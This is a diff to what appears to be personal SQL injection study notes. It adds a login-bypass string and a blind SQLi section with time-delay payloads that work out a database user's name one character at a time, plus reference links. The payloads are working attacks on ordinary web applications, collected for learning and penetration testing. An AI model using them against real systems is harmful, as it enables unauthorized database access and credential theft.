@@ -38,6 +38,7 @@ Browse the web app, note errors, behaviour.
 ```
 %' OR '0'='0
 %' OR 1=1--
+"' OR '1'='1';-- " (note the space after the second hyphen)
 ```
 
 `%` will probably not be equal to anything so will be false
@@ -92,6 +93,31 @@ etc.
 `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
 
 
+Blind SQLi
+----------
+
+When you put in a tick, you are redirected to a homepage? Suspicious.
+
+```
+id=2; waitfor delay '00:00:10'--
+id=2; IF (LEN(USER)=1) waitfor delay '00:00:10'--
+id=2; IF (LEN(USER)=2) waitfor delay '00:00:10'--
+```
+
+etc...
+
+Then, look at ASCII chart and try guessing admin username:
+
+```
+id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--
+id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+```
+
+etc.
+
+Note: sqlmap tool is good for blind sqli.
+
+
 Circumventing Simple Validation
 -------------------------------
 
@@ -133,3 +159,5 @@ Resources
 * http://seclists.org/pauldotcom/2010/q3/341  
 * https://www.notsosecure.com/more-on-true-and-error-blind-sql-injection/  
 * https://www.notsosecure.com/exploiting-sql-injections-in-insert-statements/
+* http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Willis.pdf
+* [Great introduction to SQLi](https://www.youtube.com/watch?v=P6fLRmeEKKA)
